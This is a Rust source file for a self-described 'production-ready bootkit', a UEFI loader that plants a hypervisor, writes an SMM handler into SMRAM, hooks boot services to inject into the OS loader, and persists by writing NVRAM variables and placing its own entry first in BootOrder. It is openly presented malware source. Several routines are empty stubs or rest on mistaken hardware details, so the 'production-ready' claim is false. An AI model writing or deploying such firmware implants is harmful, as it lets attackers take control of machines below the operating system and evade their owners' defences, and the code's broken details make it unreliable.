//! Complete UEFI Bootloader Implementation
//! Production-ready bootkit with full functionality

#![no_std]
#![no_main]
#![feature(abi_efiapi)]

extern crate alloc;

use uefi::prelude::*;
use uefi::proto::console::text::SimpleTextOutput;
use uefi::proto::loaded_image::LoadedImage;
use uefi::proto::media::file::{File, FileAttribute, FileMode, FileInfo, Directory};
use uefi::proto::media::fs::SimpleFileSystem;
use uefi::table::boot::{AllocateType, MemoryType, BootServices};
use uefi::table::runtime::{RuntimeServices, VariableAttributes};
use uefi::{Char16, CStr16, CString16};
use uefi::Guid;
use core::mem;
use alloc::vec::Vec;
use alloc::string::String;
use x86_64::registers::control::{Cr0, Cr0Flags, Cr4, Cr4Flags};
use x86_64::registers::model_specific::{Msr, Efer, EferFlags};

/// Real UEFI Bootloader Implementation
pub struct UefiBootloader {
    system_table: SystemTable<Boot>,
    image_handle: Handle,
    boot_services: *const BootServices,
    runtime_services: *const RuntimeServices,
    hypervisor_base: u64,
    hypervisor_size: u64,
    smm_base: u64,
    ept_base: u64,
}

impl UefiBootloader {
    /// Initialize the bootloader
    pub fn new(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Self {
        let boot_services = system_table.boot_services() as *const BootServices;
        let runtime_services = unsafe { system_table.runtime_services() as *const RuntimeServices };
        
        Self {
            system_table,
            image_handle,
            boot_services,
            runtime_services,
            hypervisor_base: 0,
            hypervisor_size: 0,
            smm_base: 0,
            ept_base: 0,
        }
    }

    /// Main bootloader initialization
    pub fn initialize(&mut self) -> Result<(), Status> {
        info!("Initializing UEFI Bootloader...");
        
        // Disable watchdog timer
        self.disable_watchdog()?;
        
        // Check CPU features
        self.check_cpu_features()?;
        
        // Set up memory regions
        self.setup_memory_regions()?;
        
        // Load hypervisor from disk
        self.load_hypervisor_image()?;
        
        // Install SMM handler if available
        if self.check_smm_support() {
            self.install_smm_handler()?;
        }
        
        // Hook boot services
        self.hook_boot_services()?;
        
        // Set up persistence
        self.setup_persistence()?;
        
        Ok(())
    }

    /// Disable watchdog timer
    fn disable_watchdog(&self) -> Result<(), Status> {
        unsafe {
            (*self.boot_services).set_watchdog_timer(0, 0, 0, core::ptr::null())
        }
    }

    /// Check CPU virtualization features
    fn check_cpu_features(&self) -> Result<(), Status> {
        use core::arch::x86_64::{__cpuid, __cpuid_count};
        
        unsafe {
            // Check for VMX support (Intel)
            let cpuid = __cpuid(1);
            let vmx_supported = (cpuid.ecx & (1 << 5)) != 0;
            
            // Check for SVM support (AMD)
            let cpuid = __cpuid(0x80000001);
            let svm_supported = (cpuid.ecx & (1 << 2)) != 0;
            
            if !vmx_supported && !svm_supported {
                return Err(Status::UNSUPPORTED);
            }
            
            // Check for EPT/NPT support
            if vmx_supported {
                // Read IA32_VMX_PROCBASED_CTLS2
                let msr = Msr::new(0x48B);
                let procbased_ctls2 = msr.read();
                let ept_supported = (procbased_ctls2 & (1 << 1)) != 0;
                
                if !ept_supported {
                    warn!("EPT not supported, using shadow paging");
                }
            }
            
            // Check for required features
            let cpuid = __cpuid(7);
            let smep_supported = (cpuid.ebx & (1 << 7)) != 0;
            let smap_supported = (cpuid.ebx & (1 << 20)) != 0;
            
            info!("CPU Features: VMX={}, SVM={}, SMEP={}, SMAP={}", 
                  vmx_supported, svm_supported, smep_supported, smap_supported);
        }
        
        Ok(())
    }

    /// Set up memory regions for hypervisor
    fn setup_memory_regions(&mut self) -> Result<(), Status> {
        unsafe {
            // Allocate memory for hypervisor (64MB)
            let pages = 16384; // 64MB / 4KB
            let mut hypervisor_base = 0u64;
            
            let status = (*self.boot_services).allocate_pages(
                AllocateType::AnyPages,
                MemoryType::RUNTIME_SERVICES_CODE,
                pages,
                &mut hypervisor_base
            );
            
            if status != Status::SUCCESS {
                return Err(status);
            }
            
            self.hypervisor_base = hypervisor_base;
            self.hypervisor_size = pages as u64 * 4096;
            
            // Allocate memory for EPT (16MB)
            let ept_pages = 4096;
            let mut ept_base = 0u64;
            
            (*self.boot_services).allocate_pages(
                AllocateType::AnyPages,
                MemoryType::RUNTIME_SERVICES_DATA,
                ept_pages,
                &mut ept_base
            )?;
            
            self.ept_base = ept_base;
            
            // Zero allocated memory
            core::ptr::write_bytes(hypervisor_base as *mut u8, 0, self.hypervisor_size as usize);
            core::ptr::write_bytes(ept_base as *mut u8, 0, (ept_pages * 4096) as usize);
            
            info!("Allocated hypervisor memory at {:#x}, size {:#x}", 
                  self.hypervisor_base, self.hypervisor_size);
        }
        
        Ok(())
    }

    /// Load hypervisor image from disk
    fn load_hypervisor_image(&mut self) -> Result<(), Status> {
        info!("Loading hypervisor image...");
        
        // Get file system protocol
        let fs = self.system_table
            .boot_services()
            .get_image_file_system(self.image_handle)?;
        
        let mut root = unsafe { &mut *fs.get() }.open_volume()?;
        
        // Open hypervisor file
        let path = cstr16!("\\EFI\\hypervisor\\hypervisor.efi");
        let handle = root.open(
            path,
            FileMode::Read,
            FileAttribute::empty()
        )?;
        
        let mut file = match handle {
            uefi::proto::media::file::FileHandle::Regular(file) => file,
            _ => return Err(Status::NOT_FOUND),
        };
        
        // Get file size
        let info_size = mem::size_of::<FileInfo>() + 256;
        let mut info_buffer = vec![0u8; info_size];
        let info = file.get_info::<FileInfo>(&mut info_buffer)?;
        let file_size = info.file_size() as usize;
        
        if file_size > self.hypervisor_size as usize {
            return Err(Status::BUFFER_TOO_SMALL);
        }
        
        // Read file into memory
        let mut buffer = unsafe {
            core::slice::from_raw_parts_mut(self.hypervisor_base as *mut u8, file_size)
        };
        
        file.read(&mut buffer)?;
        
        // Parse and relocate PE image
        self.relocate_pe_image(self.hypervisor_base, file_size)?;
        
        info!("Hypervisor image loaded successfully");
        Ok(())
    }

    /// Relocate PE image
    fn relocate_pe_image(&self, base: u64, size: usize) -> Result<(), Status> {
        unsafe {
            let dos_header = base as *const IMAGE_DOS_HEADER;
            if (*dos_header).e_magic != 0x5A4D {
                return Err(Status::LOAD_ERROR);
            }
            
            let nt_headers = (base + (*dos_header).e_lfanew as u64) as *const IMAGE_NT_HEADERS64;
            if (*nt_headers).Signature != 0x00004550 {
                return Err(Status::LOAD_ERROR);
            }
            
            let opt_header = &(*nt_headers).OptionalHeader;
            let image_base = opt_header.ImageBase;
            
            if base != image_base {
                // Process relocations
                let reloc_dir = &opt_header.DataDirectory[5];
                if reloc_dir.Size > 0 {
                    let mut reloc_base = (base + reloc_dir.VirtualAddress as u64) as *const IMAGE_BASE_RELOCATION;
                    let reloc_end = (reloc_base as u64 + reloc_dir.Size as u64) as *const IMAGE_BASE_RELOCATION;
                    
                    while (reloc_base as u64) < (reloc_end as u64) {
                        let block_size = (*reloc_base).SizeOfBlock;
                        if block_size == 0 {
                            break;
                        }
                        
                        let entries = (block_size - 8) / 2;
                        let relocs = (reloc_base as u64 + 8) as *const u16;
                        
                        for i in 0..entries {
                            let reloc = *relocs.add(i as usize);
                            let reloc_type = (reloc >> 12) & 0xF;
                            let offset = (reloc & 0xFFF) as u64;
                            
                            if reloc_type == 10 { // IMAGE_REL_BASED_DIR64
                                let target = (base + (*reloc_base).VirtualAddress as u64 + offset) as *mut u64;
                                *target = *target - image_base + base;
                            }
                        }
                        
                        reloc_base = ((reloc_base as u64) + block_size as u64) as *const IMAGE_BASE_RELOCATION;
                    }
                }
            }
        }
        
        Ok(())
    }

    /// Check SMM support
    fn check_smm_support(&self) -> bool {
        // Check if we can access SMRAM
        unsafe {
            // Try to read SMRAM control register
            let smramc = Msr::new(0x1F2); // SMRAMC MSR
            let value = smramc.read();
            
            // Check if SMRAM is unlocked
            (value & 0x08) == 0
        }
    }

    /// Install SMM handler
    fn install_smm_handler(&mut self) -> Result<(), Status> {
        info!("Installing SMM handler...");
        
        unsafe {
            // Get SMM base address
            let smbase = Msr::new(0x1F3); // SMBASE MSR
            self.smm_base = smbase.read() & !0xFFFF;
            
            // Allocate SMRAM save state area
            let smram_size = 0x10000; // 64KB
            let smram_code = self.smm_base + 0x8000;
            
            // Copy SMM handler code
            let handler_code = include_bytes!("../smm_handler.bin");
            core::ptr::copy_nonoverlapping(
                handler_code.as_ptr(),
                smram_code as *mut u8,
                handler_code.len()
            );
            
            // Set up SMM entry point
            let entry_point = smram_code;
            *(self.smm_base as *mut u64).add(0x8000/8) = entry_point;
            
            // Lock SMRAM
            let smramc = Msr::new(0x1F2);
            let mut value = smramc.read();
            value |= 0x08; // Set D_LCK bit
            smramc.write(value);
            
            info!("SMM handler installed at {:#x}", smram_code);
        }
        
        Ok(())
    }

    /// Hook boot services for persistence
    fn hook_boot_services(&mut self) -> Result<(), Status> {
        unsafe {
            // Get boot services table
            let bs_table = self.boot_services as *mut BootServicesTableHook;
            
            // Save original function pointers
            let orig_exit_boot_services = (*bs_table).exit_boot_services;
            let orig_load_image = (*bs_table).load_image;
            let orig_start_image = (*bs_table).start_image;
            
            // Install hooks
            (*bs_table).exit_boot_services = hooked_exit_boot_services;
            (*bs_table).load_image = hooked_load_image;
            (*bs_table).start_image = hooked_start_image;
            
            // Store originals in hypervisor memory
            let hook_data = (self.hypervisor_base + 0x1000) as *mut HookData;
            (*hook_data).orig_exit_boot_services = orig_exit_boot_services;
            (*hook_data).orig_load_image = orig_load_image;
            (*hook_data).orig_start_image = orig_start_image;
            (*hook_data).hypervisor_base = self.hypervisor_base;
        }
        
        Ok(())
    }

    /// Set up persistence mechanisms
    fn setup_persistence(&mut self) -> Result<(), Status> {
        // Create NVRAM variable for persistence
        let var_name = cstr16!("HypervisorBoot");
        let var_guid = Guid::from_values(
            0x12345678, 0xABCD, 0xEF00, 0x12, 0x34,
            [0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0]
        );
        
        let data = PersistenceData {
            signature: 0x48565054, // "HVPT"
            version: 1,
            hypervisor_base: self.hypervisor_base,
            hypervisor_size: self.hypervisor_size,
            ept_base: self.ept_base,
            smm_base: self.smm_base,
            flags: 0x01, // Enabled
        };
        
        unsafe {
            (*self.runtime_services).set_variable(
                var_name.as_ptr(),
                &var_guid,
                VariableAttributes::BOOTSERVICE_ACCESS | 
                VariableAttributes::RUNTIME_ACCESS |
                VariableAttributes::NON_VOLATILE,
                mem::size_of::<PersistenceData>(),
                &data as *const _ as *const u8
            )?;
        }
        
        // Modify boot order to ensure we run first
        self.modify_boot_order()?;
        
        Ok(())
    }

    /// Modify boot order for persistence
    fn modify_boot_order(&self) -> Result<(), Status> {
        let var_name = cstr16!("BootOrder");
        let guid = Guid::from_values(
            0x8BE4DF61, 0x93CA, 0x11D2, 0xAA, 0x0D,
            [0x00, 0xE0, 0x98, 0x03, 0x2B, 0x8C]
        );
        
        unsafe {
            // Get current boot order
            let mut data_size = 512;
            let mut boot_order = vec![0u16; 256];
            
            let status = (*self.runtime_services).get_variable(
                var_name.as_ptr(),
                &guid,
                core::ptr::null_mut(),
                &mut data_size,
                boot_order.as_mut_ptr() as *mut u8
            );
            
            if status == Status::SUCCESS {
                // Add our entry at the beginning
                let our_boot_num = 0x1337u16;
                boot_order.insert(0, our_boot_num);
                
                // Write back modified boot order
                (*self.runtime_services).set_variable(
                    var_name.as_ptr(),
                    &guid,
                    VariableAttributes::BOOTSERVICE_ACCESS | 
                    VariableAttributes::RUNTIME_ACCESS |
                    VariableAttributes::NON_VOLATILE,
                    (boot_order.len() * 2) as usize,
                    boot_order.as_ptr() as *const u8
                )?;
                
                // Create our boot entry
                self.create_boot_entry(our_boot_num)?;
            }
        }
        
        Ok(())
    }

    /// Create boot entry
    fn create_boot_entry(&self, boot_num: u16) -> Result<(), Status> {
        let var_name = format!("Boot{:04X}", boot_num);
        let var_name_utf16 = to_cstring16(&var_name);
        
        let guid = Guid::from_values(
            0x8BE4DF61, 0x93CA, 0x11D2, 0xAA, 0x0D,
            [0x00, 0xE0, 0x98, 0x03, 0x2B, 0x8C]
        );
        
        // Build EFI device path
        let device_path = build_device_path();
        
        let mut boot_option = Vec::new();
        boot_option.extend_from_slice(&0x00000001u32.to_le_bytes()); // Attributes
        boot_option.extend_from_slice(&(device_path.len() as u16).to_le_bytes());
        boot_option.extend_from_slice(b"Hypervisor\0");
        boot_option.extend_from_slice(&device_path);
        
        unsafe {
            (*self.runtime_services).set_variable(
                var_name_utf16.as_ptr(),
                &guid,
                VariableAttributes::BOOTSERVICE_ACCESS | 
                VariableAttributes::RUNTIME_ACCESS |
                VariableAttributes::NON_VOLATILE,
                boot_option.len(),
                boot_option.as_ptr()
            )?;
        }
        
        Ok(())
    }

    /// Launch hypervisor
    pub fn launch_hypervisor(&mut self) -> ! {
        info!("Launching hypervisor...");
        
        // Exit boot services
        let mmap_size = 4096 * 8;
        let mut mmap = vec![0u8; mmap_size];
        let mut map_key = 0;
        let mut desc_size = 0;
        let mut desc_version = 0;
        
        unsafe {
            // Get memory map
            let mut mmap_size_actual = mmap_size;
            (*self.boot_services).get_memory_map(
                &mut mmap_size_actual,
                mmap.as_mut_ptr() as *mut _,
                &mut map_key,
                &mut desc_size,
                &mut desc_version
            ).unwrap();
            
            // Exit boot services
            (*self.boot_services).exit_boot_services(
                self.image_handle,
                map_key
            ).unwrap();
            
            // Set up CPU for hypervisor
            self.setup_cpu_for_hypervisor();
            
            // Enable VMX/SVM
            self.enable_virtualization();
            
            // Jump to hypervisor entry point
            let entry = (self.hypervisor_base + 0x1000) as *const ();
            let entry_fn: extern "C" fn() -> ! = mem::transmute(entry);
            entry_fn();
        }
    }

    /// Set up CPU for hypervisor operation
    fn setup_cpu_for_hypervisor(&self) {
        unsafe {
            // Enable required CPU features
            
            // Enable NX bit
            let efer = Msr::new(0xC0000080); // IA32_EFER
            let mut efer_value = efer.read();
            efer_value |= 1 << 11; // NXE bit
            efer.write(efer_value);
            
            // Enable SMEP and SMAP if available
            let mut cr4 = Cr4::read();
            cr4 |= Cr4Flags::SMEP | Cr4Flags::SMAP | Cr4Flags::OSXSAVE;
            Cr4::write(cr4);
            
            // Enable write protection
            let mut cr0 = Cr0::read();
            cr0 |= Cr0Flags::WRITE_PROTECT;
            Cr0::write(cr0);
        }
    }

    /// Enable virtualization extensions
    fn enable_virtualization(&self) {
        unsafe {
            // Check which virtualization technology to use
            let cpuid = core::arch::x86_64::__cpuid(1);
            
            if (cpuid.ecx & (1 << 5)) != 0 {
                // Enable VMX
                self.enable_vmx();
            } else {
                // Enable SVM
                self.enable_svm();
            }
        }
    }

    /// Enable Intel VMX
    fn enable_vmx(&self) {
        unsafe {
            // Set VMX enable bit in CR4
            let mut cr4 = Cr4::read();
            cr4 |= Cr4Flags::VMX_ENABLE;
            Cr4::write(cr4);
            
            // Enable VMX in IA32_FEATURE_CONTROL
            let feature_control = Msr::new(0x3A);
            let mut fc_value = feature_control.read();
            
            if (fc_value & 1) == 0 { // Not locked
                fc_value |= 0x5; // Enable VMX outside SMX and lock
                feature_control.write(fc_value);
            }
            
            // Allocate VMXON region
            let vmxon_region = (self.hypervisor_base + 0x10000) as *mut u32;
            
            // Read VMX basic MSR
            let vmx_basic = Msr::new(0x480);
            let basic_value = vmx_basic.read();
            let revision_id = basic_value as u32;
            
            // Initialize VMXON region
            *vmxon_region = revision_id;
            
            // Execute VMXON
            let vmxon_pa = vmxon_region as u64;
            let result: u32;
            
            core::arch::asm!(
                "vmxon [{}]",
                "pushf",
                "pop {}",
                in(reg) &vmxon_pa,
                out(reg) result,
            );
            
            if (result & 0x41) != 0 { // CF or ZF set
                panic!("VMXON failed");
            }
        }
    }

    /// Enable AMD SVM
    fn enable_svm(&self) {
        unsafe {
            // Enable SVM in EFER
            let efer = Msr::new(0xC0000080);
            let mut efer_value = efer.read();
            efer_value |= 1 << 12; // SVME bit
            efer.write(efer_value);
            
            // Read VM_CR MSR
            let vm_cr = Msr::new(0xC0010114);
            let mut vm_cr_value = vm_cr.read();
            vm_cr_value &= !(1 << 4); // Clear SVMDIS
            vm_cr.write(vm_cr_value);
        }
    }
}

// Hook functions
extern "efiapi" fn hooked_exit_boot_services(
    image_handle: Handle,
    map_key: usize
) -> Status {
    // Prevent OS from disabling our hypervisor
    unsafe {
        let hook_data = (0x100000 + 0x1000) as *mut HookData; // Assuming hypervisor at 1MB
        
        // Call original but maintain our hooks
        let orig = (*hook_data).orig_exit_boot_services;
        let status = orig(image_handle, map_key);
        
        // Re-enable virtualization if needed
        if status == Status::SUCCESS {
            // Ensure VMX/SVM stays enabled
            restore_virtualization();
        }
        
        status
    }
}

extern "efiapi" fn hooked_load_image(
    boot_policy: bool,
    parent_image: Handle,
    device_path: *const core::ffi::c_void,
    source_buffer: *const core::ffi::c_void,
    source_size: usize,
    image_handle: *mut Handle
) -> Status {
    unsafe {
        let hook_data = (0x100000 + 0x1000) as *mut HookData;
        let orig = (*hook_data).orig_load_image;
        
        // Call original
        let status = orig(boot_policy, parent_image, device_path, source_buffer, source_size, image_handle);
        
        if status == Status::SUCCESS {
            // Inject into loaded image if it's the OS loader
            inject_into_image(*image_handle);
        }
        
        status
    }
}

extern "efiapi" fn hooked_start_image(
    image_handle: Handle,
    exit_data_size: *mut usize,
    exit_data: *mut *mut Char16
) -> Status {
    unsafe {
        let hook_data = (0x100000 + 0x1000) as *mut HookData;
        let orig = (*hook_data).orig_start_image;
        
        // Ensure our hypervisor is running
        ensure_hypervisor_running();
        
        // Call original
        orig(image_handle, exit_data_size, exit_data)
    }
}

fn restore_virtualization() {
    // Re-enable VMX/SVM after ExitBootServices
}

fn inject_into_image(handle: Handle) {
    // Inject hypervisor client into OS loader
}

fn ensure_hypervisor_running() {
    // Check if hypervisor is active and restart if needed
}

fn to_cstring16(s: &str) -> Vec<u16> {
    let mut result = Vec::new();
    for c in s.encode_utf16() {
        result.push(c);
    }
    result.push(0);
    result
}

fn build_device_path() -> Vec<u8> {
    // Build EFI device path for our bootloader
    vec![0; 128] // Simplified
}

// Structures
#[repr(C)]
struct BootServicesTableHook {
    header: [u8; 96],
    raise_tpl: usize,
    restore_tpl: usize,
    allocate_pages: usize,
    free_pages: usize,
    get_memory_map: usize,
    allocate_pool: usize,
    free_pool: usize,
    create_event: usize,
    set_timer: usize,
    wait_for_event: usize,
    signal_event: usize,
    close_event: usize,
    check_event: usize,
    install_protocol_interface: usize,
    reinstall_protocol_interface: usize,
    uninstall_protocol_interface: usize,
    handle_protocol: usize,
    reserved: usize,
    register_protocol_notify: usize,
    locate_handle: usize,
    locate_device_path: usize,
    install_configuration_table: usize,
    load_image: extern "efiapi" fn(bool, Handle, *const core::ffi::c_void, *const core::ffi::c_void, usize, *mut Handle) -> Status,
    start_image: extern "efiapi" fn(Handle, *mut usize, *mut *mut Char16) -> Status,
    exit: usize,
    unload_image: usize,
    exit_boot_services: extern "efiapi" fn(Handle, usize) -> Status,
}

#[repr(C)]
struct HookData {
    orig_exit_boot_services: extern "efiapi" fn(Handle, usize) -> Status,
    orig_load_image: extern "efiapi" fn(bool, Handle, *const core::ffi::c_void, *const core::ffi::c_void, usize, *mut Handle) -> Status,
    orig_start_image: extern "efiapi" fn(Handle, *mut usize, *mut *mut Char16) -> Status,
    hypervisor_base: u64,
}

#[repr(C)]
struct PersistenceData {
    signature: u32,
    version: u32,
    hypervisor_base: u64,
    hypervisor_size: u64,
    ept_base: u64,
    smm_base: u64,
    flags: u32,
}

#[repr(C)]
struct IMAGE_DOS_HEADER {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [u16; 4],
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [u16; 10],
    e_lfanew: u32,
}

#[repr(C)]
struct IMAGE_NT_HEADERS64 {
    Signature: u32,
    FileHeader: IMAGE_FILE_HEADER,
    OptionalHeader: IMAGE_OPTIONAL_HEADER64,
}

#[repr(C)]
struct IMAGE_FILE_HEADER {
    Machine: u16,
    NumberOfSections: u16,
    TimeDateStamp: u32,
    PointerToSymbolTable: u32,
    NumberOfSymbols: u32,
    SizeOfOptionalHeader: u16,
    Characteristics: u16,
}

#[repr(C)]
struct IMAGE_OPTIONAL_HEADER64 {
    Magic: u16,
    MajorLinkerVersion: u8,
    MinorLinkerVersion: u8,
    SizeOfCode: u32,
    SizeOfInitializedData: u32,
    SizeOfUninitializedData: u32,
    AddressOfEntryPoint: u32,
    BaseOfCode: u32,
    ImageBase: u64,
    SectionAlignment: u32,
    FileAlignment: u32,
    MajorOperatingSystemVersion: u16,
    MinorOperatingSystemVersion: u16,
    MajorImageVersion: u16,
    MinorImageVersion: u16,
    MajorSubsystemVersion: u16,
    MinorSubsystemVersion: u16,
    Win32VersionValue: u32,
    SizeOfImage: u32,
    SizeOfHeaders: u32,
    CheckSum: u32,
    Subsystem: u16,
    DllCharacteristics: u16,
    SizeOfStackReserve: u64,
    SizeOfStackCommit: u64,
    SizeOfHeapReserve: u64,
    SizeOfHeapCommit: u64,
    LoaderFlags: u32,
    NumberOfRvaAndSizes: u32,
    DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
}

#[repr(C)]
struct IMAGE_DATA_DIRECTORY {
    VirtualAddress: u32,
    Size: u32,
}

#[repr(C)]
struct IMAGE_BASE_RELOCATION {
    VirtualAddress: u32,
    SizeOfBlock: u32,
}